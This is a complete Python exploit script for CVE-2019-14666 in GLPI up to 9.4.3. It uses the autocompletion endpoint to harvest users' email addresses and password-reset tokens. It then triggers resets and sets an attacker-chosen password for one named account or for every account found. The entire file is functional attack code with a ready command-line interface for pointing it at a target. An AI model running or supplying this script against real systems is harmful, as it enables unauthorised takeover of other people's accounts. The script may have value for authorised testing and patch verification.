#!/usr/bin/env python3

#
# CVE-2019-14666 - Account takeover
# Software: GLPI <= 9.4.3
# Details:  https://github.com/blackarrowsec/advisories/tree/master/2019/CVE-2019-14666
#

# Built-in imports
import re
import json
import argparse

# Third party library imports
import httpx


class GlpiBrowser:
    def __init__(self, url: str, user: str, password: str):
        """Initialize the browser with target URL and login credentials."""
        self.__url = url
        self.__user = user
        self.__password = password

        self.__client = httpx.Client(
            http1=True,
            verify=False,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            },
            follow_redirects=False,
        )

        self.__logged_in = False

        print(f"[+] {self!s}")

    # Dunders
    def __repr__(self) -> str:
        """Return a machine-readable representation of the browser instance."""
        return f"<GlpiBrowser(url={self.__url!r}, user={self.__user!r}), password={self.__password!r}>"

    def __str__(self) -> str:
        """Return a human-readable representation of the browser instance."""
        return f"GLPI Browser targeting {self.__url!r} with following credentials: {self.__user!r}:{self.__password!r}."

    # Public methods
    def is_alive(self) -> bool:
        """Check if the target GLPI instance is alive and responding."""
        try:
            self.__client.get(url=self.__url, timeout=3)
        except Exception as error:
            print(f"[-] Impossible to reach the target.")
            print(f"[x] Root cause: {error}")
            return False
        else:
            print(f"[+] Target is up and responding.")
            return True

    def get_data(self, itemtype: str, field: str, term: str = None) -> list:
        """
        Retrieve specific data from GLPI using the autocompletion endpoint.

        Args:
            itemtype (str): The type of the item for which data is being fetched.
            field (str): The specific field of the itemtype to query.
            term (str, optional): Search term to narrow down the results. Defaults to None.

        Returns:
            list: List of data if the request is successful and data is found, otherwise None.
        """
        data_request = self.__client.get(
            f"{self.__url}/ajax/autocompletion.php",
            params={"itemtype": itemtype, "field": field, "term": term if term else ""},
        )
        if data_request.status_code == 200:
            try:
                data = json.loads(data_request.text)
            except:
                return None
            else:
                return data
        return None

    def login(self) -> bool:
        """Attempt to login to the GLPI instance with provided credentials."""
        html_text = self.__client.get(url=self.__url).text
        csrf_token = self.__extract_csrf(html=html_text)
        name_field = re.search(r'name="(.*)" id="login_name"', html_text).group(1)
        pass_field = re.search(r'name="(.*)" id="login_password"', html_text).group(1)

        login_request = self.__client.post(
            url=f"{self.__url}/front/login.php",
            data={
                name_field: self.__user,
                pass_field: self.__password,
                "auth": "local",
                "submit": "Post",
                "_glpi_csrf_token": csrf_token,
            },
        )

        is_good = login_request.status_code == 302
        if is_good:
            print(f"[+] User {self.__user!r} is logged in.")
            self.__logged_in = True
            return True
        self.__logged_in = False
        return False

    def get_forget_token(self) -> list:
        """Retrieve forgotten password tokens from GLPI."""
        if tokens := self.get_data("User", "password_forget_token"):
            print(f"[+] Forgot tokens retrieved: {tokens}")
            return tokens

    def get_emails(self) -> list:
        """Retrieve emails associated with the GLPI users."""
        if emails := self.get_data("UserEmail", "email"):
            print(f"[+] Emails retrieved: {emails}")
            return emails

    def change_password(self, email: str, password: str, token: str) -> bool:
        """
        Attempt to change the password for a given email using a specified token.

        Args:
            email (str): The email address of the user for whom the password needs to be changed.
            password (str): The new password to be set for the user.
            token (str): The token used to authenticate the password change request.

        Returns:
            bool: True if the password change was successful, False otherwise.
        """
        data = {
            "email": email,
            "password": password,
            "password2": password,
            "password_forget_token": token,
            "update": "Save",
            "_glpi_csrf_token": self.__extract_csrf(
                html=self.__client.get(
                    f"{self.__url}/front/lostpassword.php",
                    params={"password_forget_token": token},
                ).text
            ),
        }

        password_reset = self.__client.post(
            "{}/front/lostpassword.php".format(self.__url), data=data
        )

        password_reset.raise_for_status()
        if "Reset password successful" in password_reset.text:
            print(f"[+] Password changed to: {password!r}")
            return True

        return False

    def account_takeover(self, email: str = None, password: str = None) -> None:
        """
        Perform an account takeover by exploiting the forgotten password tokens.

        This method starts by logging in with the provided credentials. If the login is
        successful, it fetches any existing password forget tokens. If an email target
        isn't specified, the method retrieves all associated emails and attempts a
        takeover for each one. During the takeover attempt for a specific email, it tries
        to initiate a password reset for that email address. If during this process a
        new token is generated, it attempts to use this new token to reset the password
        to the provided one or to a default if none was specified.

        Args:
            email (str, optional): The target email address for the account takeover.
                                   If not provided, the method will target all available emails.
            password (str, optional): The desired new password to set during the takeover.
                                      If not provided, a default password will be used.

        Returns:
            None: This method does not return any value but prints out the status and results
                  of the takeover attempt.
        """
        if email is None:
            emails_retrieved = self.get_emails()
            for email_ in emails_retrieved:
                self.account_takeover(email=email_, password=password)
            return

        print(
            f"[*] Initiating takeover attempt for the account associated with email {email!r}..."
        )

        if not self.__logged_in:
            self.login()

        tokens = self.get_forget_token()
        if tokens is None:
            tokens = []

        if not self.__resetting_password(email):
            return

        new_tokens = self.get_forget_token()

        if new_tokens is None:
            return
        if res := list(set(new_tokens) - set(tokens)):
            for token in res:
                print(f"[*] Trying token {token}...")
                if self.change_password(email, password, token):
                    return

    # Private methods
    def __extract_csrf(self, html: str) -> str:
        """
        Extract the CSRF token from the provided HTML content.

        Args:
            html (str): The HTML content where the CSRF token should be present.

        Returns:
            str: The extracted CSRF token if found, otherwise None.
        """
        if match := re.search(r'name="_glpi_csrf_token" value="([a-f0-9]{32})"', html):
            csrf = match.group(1)
            return csrf

    def __resetting_password(self, email: str = None) -> bool:
        """
        Initiate a password reset process for the provided email.

        This method sends a password reset request for the provided email
        and checks if the reset request was successful.

        Args:
            email (str, optional): The email address to initiate a password reset.
                                If not provided, no action is taken.

        Returns:
            bool: True if the password reset request was successful (i.e., an email was sent),
                otherwise False.
        """
        if email is None:
            return
        lost_pwd_request = self.__client.post(
            f"{self.__url}/front/lostpassword.php",
            data={
                "email": email,
                "update": "Save",
                "_glpi_csrf_token": self.__extract_csrf(
                    self.__client.get(f"{self.__url}/front/lostpassword.php").text
                ),
            },
        )
        return "An email has been sent" in lost_pwd_request.text


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Target URL.", required=True)
    parser.add_argument("-u", "--user", help="Username.", required=True)
    parser.add_argument("-p", "--password", help="Password.", required=True)
    parser.add_argument(
        "-e", "--email", help="Target email.", required=False, default=None
    )
    parser.add_argument(
        "-n",
        "--new-password",
        help="New password.",
        required=False,
        default="GPLit@k30v/r",
    )

    options = parser.parse_args()

    target = GlpiBrowser(options.target, user=options.user, password=options.password)

    if not target.is_alive():
        return

    if target.login():
        target.account_takeover(email=options.email, password=options.new_password)


if __name__ == "__main__":
    main()
